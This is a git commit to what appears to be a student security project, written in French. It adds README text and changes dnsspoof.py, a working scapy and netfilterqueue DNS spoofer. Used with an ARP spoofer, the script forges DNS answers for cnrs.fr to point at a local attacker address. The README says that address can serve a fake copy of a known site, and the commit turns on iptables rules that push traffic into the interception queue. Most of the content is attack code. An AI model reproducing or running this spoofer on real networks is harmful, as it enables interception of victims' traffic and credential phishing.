4cf5b972d3a76f991f7ff9b9b081bb89d37b318a
Nans <ge89vil@mytum.de>
2022-06-06 21:47:52 +0200

    [#5] Problèmes dnsspoofer non résolus

--- dns/README.md
+++ dns/README.md
@@ -7,3 +7,9 @@ Pour l'utiliser sur une victime, il faut l'utiliser en parallèle le l'arp spoof
 
 ## dnsspoof.py
 
+Crée un DNS Spoofer, ce programme permet d'intercepter les paquets DNS, et de les modifier afin de rediriger vers l'adresse voulue (par exemple la notre, sur laquelle on peut faire tourner un serveur apache qui imite une page connue).
+** A utiliser en parallèle de l'arp spoofer **
+
+## dnspoofsummary.py
+
+Idem que le précédent mais print le summary du paquet.
--- dns/dnsspoof.py
+++ dns/dnsspoof.py
@@ -13,15 +13,14 @@ def del_fields(scapy_packet): #supprimer les champs len et chksum qui, s'ils ne 
 
 
 def process_packet(packet):
-	#print("process_packet")
 	scapy_packet = scapy.IP(packet.get_payload()) #,IP header ; on veut avoir le payload du paquet qui contient la requete/reponse DNS
 	if scapy_packet.haslayer(scapy.DNSRR): #si c'est une reponse DNS ; sinon DNSQR pour request
 		print("layer DNSRR")
 		qname = scapy_packet[scapy.DNSQR].qname #si on recoit une reponse DNS, le query name (la recherche dans la barre) sera le qname du paquet demande (DNSRQ)
 		print("qname : " + str(qname))
-		if "horizons21.fr" in str(qname): #si le site est dans le qname
+		if "cnrs.fr" in str(qname): #si le site est dans le qname
 			print("trouve")
-			answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.27") #reponse ; rrname = qname, rdata = l'ip vers laquelle on veut rediriger
+			answer = scapy.DNSRR(rrname=qname, rdata="192.168.0.100") #reponse ; rrname = qname, rdata = l'ip vers laquelle on veut rediriger
 			scapy_packet[scapy.DNS].an = answer #an est la partie answer du paquet
 			scapy_packet[scapy.DNS].ancount = 1 #une seule reponse, on peut en mettre plusieurs
 
@@ -29,15 +28,14 @@ def process_packet(packet):
 
 			packet.set_payload(bytes(scapy_packet)) #dans python3, set_payload contient des bytes, dans python2, c'est un str()
 	packet.accept() #va envoyer le paquet modifie
-#print("packet sent")
 
 os.system("sudo iptables --flush")
 os.system("sudo iptables -I FORWARD -j NFQUEUE --queue-num 0")
-os.system(f"iptables -A FORWARD -o eth0 -j ACCEPT")
-os.system(f"iptables -A FORWARD -m state --state ESTABLISHED,RELATED -i eth0 -j ACCEPT")
-#os.system('sudo iptables -t nat PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 0')
-#os.system("sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0") #celui la et celui d'en dessous juste sur la machine locale
-#os.system("sudo iptables -I INPUT -j NFQUEUE --queue-num 0")
+os.system(f"iptables -A FORWARD -o wlan0 -j ACCEPT")
+os.system(f"iptables -A FORWARD -m state --state ESTABLISHED,RELATED -i wlan0 -j ACCEPT")
+os.system('sudo iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 0')
+os.system("sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0") #celui la et celui d'en dessous juste sur la machine locale
+os.system("sudo iptables -I INPUT -j NFQUEUE --queue-num 0")
 
 queue = netfilterqueue.NetfilterQueue() #objet queue
 try:
